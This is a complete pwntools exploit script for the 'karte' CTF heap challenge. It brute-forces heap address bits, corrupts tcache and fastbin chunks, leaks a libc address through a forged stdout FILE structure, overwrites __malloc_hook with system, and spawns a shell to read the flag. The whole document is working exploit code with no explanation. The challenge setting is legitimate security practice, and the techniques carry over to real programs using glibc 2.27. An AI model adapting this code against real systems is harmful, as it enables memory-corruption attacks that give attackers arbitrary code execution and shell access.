from pwn import *

while True:
  try:
    r = process("./karte", env={"LD_PRELOAD":"libc-2-cd7c1a035d24122798d97a47a10f6e2b71d58710aecfd392375f1aa9bdde164d.27.so"})
    #r = remote("karte.chal.ctf.westerns.tokyo", 10001)

    r.recvuntil("...")
    r.send("A"*63)
    r.recvuntil(">")

    def add(size, data):
      r.sendline("1")
      r.recvuntil(">")
      r.sendline(str(size))
      r.recvuntil(">")
      r.send(data)
      r.recvuntil("id ")
      sice = int(r.recvline())
      r.recvuntil(">")
      return sice

    def delete(sice):
      r.sendline("3")
      r.recvuntil(">")
      r.sendline(str(sice))
      r.recvuntil(">")

    def modify(sice, data):
      r.sendline("4")
      r.recvuntil(">")
      r.sendline(str(sice))
      r.recvuntil(">")
      r.send(data)
      r.recvuntil(">")

    def change(newname):
      r.sendline("99")
      r.recvuntil("...")
      r.send(newname)
      r.recvuntil(">")

    name = 0x00000000006021A0

    for i in range(8):
      id1 = add(0x38, "B")
      delete(id1)

    for i in range(7):
      id1 = add(0x78, "B")
      delete(id1)

    for i in range(7):
      id1 = add(0x68, "B")
      delete(id1)

    for i in range(7):
      id1 = add(0x138, "B")
      delete(id1)

    """
    pid = r.pid
    maps = open("/proc/{}/maps".format(pid), "r").read()
    heap = -1
    print maps
    for i in maps.split("\n"):
      if "heap" in i:
        heap = int(i.split("-")[0], 16)
    print hex(heap)
    nibble = (heap >> 12 & 0xf) << 4
    print hex(nibble)
    """
    nibble = random.randint(0, 15) << 4
    nibble2 = random.randint(0, 15) << 4

    id1 = add(0x78, "B")
    id2 = add(0x78, "A"*0x50 + (p64(0x0) + p64(0x71) + p64(0x0) + "\x71"))
    id3 = add(0x138, (p64(0x0) + p64(0x21))*(0x138/0x10 - 1))
    delete(id2)
    delete(id1)
    modify(id1, p64(name).strip("\x00") + "\x00")
    change(p64(0x0) + p64(0x81))
    id1 = add(0x78, "C")
    id2 = add(0x78, "\x00"*0x68 + p64(0x21)) # chunk in global dice
    change(p64(0x0) + p64(0x71))

    delete(id1)

    id1 = add(0x68, "E")
    delete(id1)
    delete(id2)

    delete(id3)
    change(p64(0x0) + p64(0x71) + "\x90" + chr((nibble+0x10) | 0x4))

    id1 = add(0x68, "\x00")
    id2 = add(0x68, p64(0x0) + p64(0x141)  + p64(name + 0x10) + p64(name))
    delete(id2)
    delete(id1)


    id1 = add(0x68, "A")
    delete(id1)
    id2 = add(0x78, "A")
    temp = add(0x38, "A")
    id3 = add(0x138, "USELESS") # get libc pointer onto name buf
    change(p64(0x0) + p64(0x71) + "\x1d" + chr(nibble2 | 0x7))

    delete(temp)


    id1 = add(0x68, "GLOBAL")
    delete(id2)
    r.sendline("1")
    r.recvuntil(">")
    r.sendline(str(0x68))
    r.recvuntil(">")
    r.send("B"*3 + p64(0x0)*6 + p64(0xfbad1800) + p64(0x0)*3 + "\x00")


    r.recvuntil("\x00")
    leak = u64(r.recv(20)[7:][:8])
    print hex(leak)
    libcbase = leak - 0x3ed8b0
    r.recvuntil("id ")
    stdout_chunk = int(r.recvline())
    r.recvuntil(">")

    target = 0x602145

    delete(id1)

    change(p64(0x0) + p64(0x71) + p64(target))

    sice = add(0x68, "A")
    change(p64(0x0) + p64(0x51))
    delete(sice)

    tomodify = 0x602148
    ptrlist_chunk = add(0x68, "AAAABBBBCCC" + p32(0) + "DEEE" + p64(tomodify) + p64(0x0000deadc0bebeef))

    modify(0x45454544, p64(0x6021b0)[:6])

    change(p64(0x0) + p64(0x71))
    delete(stdout_chunk)

    mallochook = libcbase + 0x3ebc0d
    change(p64(0x0) + p64(0x71) + p64(mallochook))

    first = add(0x68, "TRASH")
    change(p64(0x0) + p64(0x51))
    delete(first)
    first = add(0x68, "A"*19 + p64(libcbase + 0x4f440))

    print libcbase + 0x1b3e9a

    change("/bin/sh\x00")
    r.sendline("1")
    r.recvuntil(">")
    r.sendline(str(name))

    r.sendline("ls; cat flag*")
    r.interactive()

    exit()

  except:
    r.close()
    pass

